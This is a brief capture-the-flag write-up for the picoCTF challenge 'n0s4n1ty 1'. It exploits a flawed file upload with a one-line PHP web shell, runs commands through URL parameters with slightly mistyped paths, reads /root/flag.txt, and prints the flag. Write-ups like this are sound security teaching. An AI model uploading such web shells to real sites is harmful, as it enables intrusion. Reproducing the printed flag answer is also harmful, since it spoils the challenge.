## n0s4n1ty 1

- Author: Prince Niyonshuti N.

Description

A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. 

Your ultimate goal is to find the hidden flag located in the /root directory.
Additional details will be available after launching your challenge instance.
_____________________________________________________________________________________________

It hinted at a sanity issue related to file upload, which instantly made me think of Pentestmonkey’s reverse shell. But then decided to go something simpler

So instead of using the Pentestmonkey shell, I created a basic web shell using PHP:

Solution:

upload shell.php to the file upload with payload, this is to create a basic web shell
```bash
<?php system($_GET['cmd']); ?>
```

then on the url go to, uploads/shell.php?=cmd=id
this is where we can use the shell web to conduct our findings

see here for more info: https://medium.com/@mysticraganork66/n0s4n1ty-1-pico-ctf-13f26a68f9bf

then do uploads/shell.pho?=cmd=sudo cat /root/flag.txt
then we get our flag.
```bash
picoCTF{wh47_c4n_u_d0_wPHP_4043cda3}
```
